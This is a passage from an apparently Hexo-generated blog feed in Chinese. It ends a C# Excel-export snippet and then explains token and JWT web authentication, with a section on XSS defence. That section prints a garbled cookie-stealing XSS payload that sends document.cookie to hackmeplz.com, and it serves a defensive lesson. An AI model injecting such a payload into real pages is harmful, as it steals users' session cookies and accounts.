class=&quot;line&quot;&gt;                        continue;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    if (num == 0)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        row.CreateCell(cellCol).SetCellValue(attr.DisplayName);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        cellCol++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        continue;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    var value = property.GetValue(model, null) ?? &amp;quot;&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    switch (property.PropertyType.ToString())&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        case &amp;quot;System.Boolean&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            row.CreateCell(cellCol).SetCellValue(Convert.ToBoolean(value));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        case &amp;quot;System.DateTime&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            row.CreateCell(cellCol).SetCellValue(Convert.ToDateTime(value).ToString(&amp;quot;yyyy-MM-dd hh:mm:ss&amp;quot;));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        case &amp;quot;System.Double&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        case &amp;quot;System.Int32&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        case &amp;quot;System.Decimal&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            row.CreateCell(cellCol).SetCellValue(Convert.ToDouble(value));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        default:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            row.CreateCell(cellCol).SetCellValue(value.ToString());&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                            break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    cellCol++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需求说明&quot;&gt;&lt;a href=&quot;#需求说明&quot; class=&quot;headerlink&quot; title=&quot;需求说明&quot;&gt;&lt;/a&gt;需求说明&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;点击按钮，获取页面form表单的数据，发送到服务器生成Excel文档并下载到客户端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果参数比较简单，我们可以直接通过GET请求访问生成Excel文档的Action。如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;location.href = abp.appPath + &amp;apos;Service/Export?input=&amp;apos; + result;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但是，如果参数比较复杂，且数量较多，继续使用这种方式则显得比较繁琐，并且容易报错。&lt;br&gt;此时，我们可以迂回一下，先把请求参数缓存到服务器，然后在生成Excel时从缓存获取参数。&lt;br&gt;
    
    </summary>
    
    
      <category term="ABP" scheme="http://qrframe.com/tags/ABP/"/>
    
  </entry>
  
  <entry>
    <title>基于Token的WEB认证机制</title>
    <link href="http://qrframe.com/2017/08/01/%E5%9F%BA%E4%BA%8EToken%E7%9A%84WEB%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/"/>
    <id>http://qrframe.com/2017/08/01/基于Token的WEB认证机制/</id>
    <published>2017-08-01T08:27:13.000Z</published>
    <updated>2017-12-03T08:35:06.835Z</updated>
    
    <content type="html">&lt;h1 id=&quot;几种常用的认证机制&quot;&gt;&lt;a href=&quot;#几种常用的认证机制&quot; class=&quot;headerlink&quot; title=&quot;几种常用的认证机制&quot;&gt;&lt;/a&gt;几种常用的认证机制&lt;/h1&gt;&lt;h2 id=&quot;HTTP-Basic-Auth&quot;&gt;&lt;a href=&quot;#HTTP-Basic-Auth&quot; class=&quot;headerlink&quot; title=&quot;HTTP Basic Auth&quot;&gt;&lt;/a&gt;HTTP Basic Auth&lt;/h2&gt;&lt;p&gt;HTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful API时，尽量避免采用HTTP Basic Auth&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;OAuth&quot;&gt;&lt;a href=&quot;#OAuth&quot; class=&quot;headerlink&quot; title=&quot;OAuth&quot;&gt;&lt;/a&gt;OAuth&lt;/h2&gt;&lt;p&gt;OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。&lt;br&gt;OAuth允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容下面是OAuth2.0的流程：&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/2220751-64bfa9182292fc51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;strong&gt;这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用；&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;Cookie-Auth&quot;&gt;&lt;a href=&quot;#Cookie-Auth&quot; class=&quot;headerlink&quot; title=&quot;Cookie Auth&quot;&gt;&lt;/a&gt;Cookie Auth&lt;/h2&gt;&lt;p&gt;Cookie认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time使cookie在一定时间内有效；&lt;/p&gt;
&lt;h2 id=&quot;Token-Auth&quot;&gt;&lt;a href=&quot;#Token-Auth&quot; class=&quot;headerlink&quot; title=&quot;Token Auth&quot;&gt;&lt;/a&gt;Token Auth&lt;/h2&gt;&lt;h4 id=&quot;Token-Auth的优点&quot;&gt;&lt;a href=&quot;#Token-Auth的优点&quot; class=&quot;headerlink&quot; title=&quot;Token Auth的优点&quot;&gt;&lt;/a&gt;Token Auth的优点&lt;/h4&gt;&lt;p&gt;Token机制相对于Cookie机制又有什么好处呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;支持跨域访问&lt;/strong&gt;: Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无状态(也称：服务端可扩展行)&lt;/strong&gt;:Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;更适用CDN&lt;/strong&gt;: 可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML,图片等），而你的服务端只要提供API即可.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;去耦&lt;/strong&gt;: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;更适用于移动应用&lt;/strong&gt;: 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CSRF&lt;/strong&gt;:因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能&lt;/strong&gt;: 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不需要为登录页面做特殊处理&lt;/strong&gt;: 如果你使用Protractor 做功能测试的时候，不再需要为登录页面做特殊处理.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于标准化&lt;/strong&gt;:你的API可以采用标准化的 JSON Web Token (JWT). 这个标准已经存在多个后端库（.NET, Ruby, Java,Python, PHP）和多家公司的支持（如：Firebase,Google, Microsoft）.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基于JWT的Token认证机制实现&quot;&gt;&lt;a href=&quot;#基于JWT的Token认证机制实现&quot; class=&quot;headerlink&quot; title=&quot;基于JWT的Token认证机制实现&quot;&gt;&lt;/a&gt;基于JWT的Token认证机制实现&lt;/h1&gt;&lt;p&gt;JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。&lt;/p&gt;
&lt;h2 id=&quot;JWT的组成&quot;&gt;&lt;a href=&quot;#JWT的组成&quot; class=&quot;headerlink&quot; title=&quot;JWT的组成&quot;&gt;&lt;/a&gt;JWT的组成&lt;/h2&gt;&lt;p&gt;一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。&lt;/p&gt;
&lt;h4 id=&quot;载荷（Payload）&quot;&gt;&lt;a href=&quot;#载荷（Payload）&quot; class=&quot;headerlink&quot; title=&quot;载荷（Payload）&quot;&gt;&lt;/a&gt;载荷（Payload）&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;iss&amp;quot;: &amp;quot;Online JWT Builder&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;iat&amp;quot;: 1416797419, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;exp&amp;quot;: 1448333419, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;aud&amp;quot;: &amp;quot;www.example.com&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;sub&amp;quot;: &amp;quot;jrocket@example.com&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;GivenName&amp;quot;: &amp;quot;Johnny&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;Surname&amp;quot;: &amp;quot;Rocket&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;Email&amp;quot;: &amp;quot;jrocket@example.com&amp;quot;, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;quot;Role&amp;quot;: [ &amp;quot;Manager&amp;quot;, &amp;quot;Project Administrator&amp;quot; ] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;iss: 该JWT的签发者，是否使用是可选的；&lt;/li&gt;
&lt;li&gt;sub: 该JWT所面向的用户，是否使用是可选的；&lt;/li&gt;
&lt;li&gt;aud: 接收该JWT的一方，是否使用是可选的；&lt;/li&gt;
&lt;li&gt;exp(expires): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的；&lt;/li&gt;
&lt;li&gt;iat(issued at): 在什么时候签发的(UNIX时间)，是否使用是可选的；&lt;br&gt;其他还有：&lt;/li&gt;
&lt;li&gt;nbf (Not Before)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；是否使用是可选的；&lt;br&gt;将上面的JSON对象进行[base64编码]可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;eyJpc3MiOiJKb2huIFd1IEpXVCIsImlhdCI6MTQ0MTU5MzUwMiwiZXhwIjoxNDQxNTk0NzIyLCJhdWQiOiJ3d3cuZXhhbXBsZS5jb20iLCJzdWIiOiJqcm9ja2V0QGV4YW1wbGUuY29tIiwiZnJvbV91c2VyIjoiQiIsInRhcmdldF91c2VyIjoiQSJ9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;小知识&lt;/strong&gt;：&lt;em&gt;Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。基于 BASE64 的编码和解码很常见&lt;/em&gt;。&lt;/p&gt;
&lt;h4 id=&quot;头部（Header）&quot;&gt;&lt;a href=&quot;#头部（Header）&quot; class=&quot;headerlink&quot; title=&quot;头部（Header）&quot;&gt;&lt;/a&gt;头部（Header）&lt;/h4&gt;&lt;p&gt;JWT还需要一个头部，头部用于描述关于该JWT的最基本的信息，例如其类型以及签名所用的算法等。这也可以被表示成一个JSON对象。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;typ&amp;quot;: &amp;quot;JWT&amp;quot;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;alg&amp;quot;: &amp;quot;HS256&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在头部指明了签名算法是HS256算法。&lt;br&gt;当然头部也要进行BASE64编码，编码后的字符串如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;签名（Signature）&quot;&gt;&lt;a href=&quot;#签名（Signature）&quot; class=&quot;headerlink&quot; title=&quot;签名（Signature）&quot;&gt;&lt;/a&gt;签名（Signature）&lt;/h4&gt;&lt;p&gt;将上面的两个编码后的字符串都用句号.连接在一起（头部在前），就形成了:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后，我们将上面拼接完的字符串用HS256算法进行加密。在加密的时候，我们还需要提供一个密钥（secret）。如果我们用mystar作为密钥的话，那么就可以得到我们加密后的内容:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后将这一部分签名也拼接在被签名的字符串后面，我们就得到了完整的JWT:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在我们的请求URL中会带上这串JWT字符串：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;https://your.awesome-app.com/make-friend/?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcm9tX3VzZXIiOiJCIiwidGFyZ2V0X3VzZXIiOiJBIn0.rSWamyAYwuHCo7IFAgd1oRpSP7nzL7BF5t7ItqpKViM&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&quot;签名的目的&quot;&gt;&lt;a href=&quot;#签名的目的&quot; class=&quot;headerlink&quot; title=&quot;签名的目的&quot;&gt;&lt;/a&gt;签名的目的&lt;/h5&gt;&lt;p&gt;最后一步签名的过程，实际上是对头部以及载荷内容进行签名。一般而言，加密算法对于不同的输入产生的输出总是不一样的。对于两个不同的输入，产生同样的输出的概率极其地小（有可能比我成世界首富的概率还小）。所以，我们就把“不一样的输入产生不一样的输出”当做必然事件来看待吧。&lt;/p&gt;
&lt;p&gt;所以，如果有人对头部以及载荷的内容解码之后进行修改，再进行编码的话，那么新的头部和载荷的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。&lt;/p&gt;
&lt;h2 id=&quot;认证过程&quot;&gt;&lt;a href=&quot;#认证过程&quot; class=&quot;headerlink&quot; title=&quot;认证过程&quot;&gt;&lt;/a&gt;认证过程&lt;/h2&gt;&lt;p&gt;下面我们从一个实例来看如何运用JWT机制实现认证：&lt;/p&gt;
&lt;h4 id=&quot;登录&quot;&gt;&lt;a href=&quot;#登录&quot; class=&quot;headerlink&quot; title=&quot;登录&quot;&gt;&lt;/a&gt;登录&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;第一次认证：第一次登录，用户从浏览器输入用户名/密码，提交后到服务器的登录处理的Action层（Login Action）；&lt;/li&gt;
&lt;li&gt;Login Action调用认证服务进行用户名密码认证，如果认证通过，Login Action层调用用户信息服务获取用户信息（包括完整的用户信息及对应权限信息）；&lt;/li&gt;
&lt;li&gt;返回用户信息后，Login Action从配置文件中获取Token签名生成的秘钥信息，进行Token的生成；&lt;/li&gt;
&lt;li&gt;生成Token的过程中可以调用第三方的JWT Lib生成签名后的JWT数据；&lt;/li&gt;
&lt;li&gt;完成JWT数据签名后，将其设置到COOKIE对象中，并重定向到首页，完成登录过程；&lt;h4 id=&quot;请求认证&quot;&gt;&lt;a href=&quot;#请求认证&quot; class=&quot;headerlink&quot; title=&quot;请求认证&quot;&gt;&lt;/a&gt;请求认证&lt;/h4&gt;基于Token的认证机制会在每一次请求中都带上完成签名的Token信息，这个Token信息可能在COOKIE&lt;br&gt;中，也可能在HTTP的Authorization头中；&lt;/li&gt;
&lt;li&gt;客户端（APP客户端或浏览器）通过GET或POST请求访问资源（页面或调用API）；&lt;/li&gt;
&lt;li&gt;认证服务作为一个Middleware HOOK 对请求进行拦截，首先在cookie中查找Token信息，如果没有找到，则在HTTP Authorization Head中查找；&lt;/li&gt;
&lt;li&gt;如果找到Token信息，则根据配置文件中的签名加密秘钥，调用JWT Lib对Token信息进行解密和解码；&lt;/li&gt;
&lt;li&gt;完成解码并验证签名通过后，对Token中的exp、nbf、aud等信息进行验证；&lt;/li&gt;
&lt;li&gt;全部通过后，根据获取的用户的角色权限信息，进行对请求的资源的权限逻辑判断；&lt;/li&gt;
&lt;li&gt;如果权限逻辑判断通过则通过Response对象返回；否则则返回HTTP 401；&lt;h2 id=&quot;对Token认证的五点认识&quot;&gt;&lt;a href=&quot;#对Token认证的五点认识&quot; class=&quot;headerlink&quot; title=&quot;对Token认证的五点认识&quot;&gt;&lt;/a&gt;对Token认证的五点认识&lt;/h2&gt;对Token认证机制有5点直接注意的地方：&lt;/li&gt;
&lt;li&gt;一个Token就是一些信息的集合；&lt;/li&gt;
&lt;li&gt;在Token中包含足够多的信息，以便在后续请求中减少查询数据库的几率；&lt;/li&gt;
&lt;li&gt;服务端需要对cookie和HTTP Authrorization Header进行Token信息的检查；&lt;/li&gt;
&lt;li&gt;基于上一点，你可以用一套token认证代码来面对浏览器类客户端和非浏览器类客户端；&lt;/li&gt;
&lt;li&gt;因为token是被签名的，所以我们可以认为一个可以解码认证通过的token是由我们系统发放的，其中带的信息是合法有效的；&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基于JWT的Token认证的安全问题&quot;&gt;&lt;a href=&quot;#基于JWT的Token认证的安全问题&quot; class=&quot;headerlink&quot; title=&quot;基于JWT的Token认证的安全问题&quot;&gt;&lt;/a&gt;基于JWT的Token认证的安全问题&lt;/h1&gt;&lt;h2 id=&quot;确保验证过程的安全性&quot;&gt;&lt;a href=&quot;#确保验证过程的安全性&quot; class=&quot;headerlink&quot; title=&quot;确保验证过程的安全性&quot;&gt;&lt;/a&gt;确保验证过程的安全性&lt;/h2&gt;&lt;p&gt;如何保证用户名/密码验证过程的安全性；因为在验证过程中，需要用户输入用户名和密码，在这一过程中，用户名、密码等敏感信息需要在网络中传输。因此，在这个过程中建议采用HTTPS，通过SSL加密传输，以确保通道的安全性。&lt;/p&gt;
&lt;h2 id=&quot;如何防范XSS-Attacks&quot;&gt;&lt;a href=&quot;#如何防范XSS-Attacks&quot; class=&quot;headerlink&quot; title=&quot;如何防范XSS Attacks&quot;&gt;&lt;/a&gt;如何防范XSS Attacks&lt;/h2&gt;&lt;p&gt;浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击(Cross Site Scripting)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;![](x) a.src=&amp;apos;https://hackmeplz.com/yourCookies.png/?cookies=’&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+document.cookie;return a&amp;#125;())&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;XSS攻击代码过滤&lt;/strong&gt;&lt;br&gt;移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;采用HTTP-Only Cookies&lt;/strong&gt;&lt;br&gt;通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie；&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;//设置cookie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;response.addHeader(&amp;quot;Set-Cookie&amp;quot;, &amp;quot;uid=112; Path=/; HttpOnly&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//设置多个cookie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;response.addHeader(&amp;quot;Set-Cookie&amp;quot;, &amp;quot;uid=112; Path=/; HttpOnly&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;response.addHeader(&amp;quot;Set-Cookie&amp;quot;, &amp;quot;timeout=30; Path=/test; HttpOnly&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//设置https的cookie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;response.addHeader(&amp;quot;Set-Cookie&amp;quot;, &amp;quot;uid=112; Path=/; Secure; HttpOnly&amp;quot;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
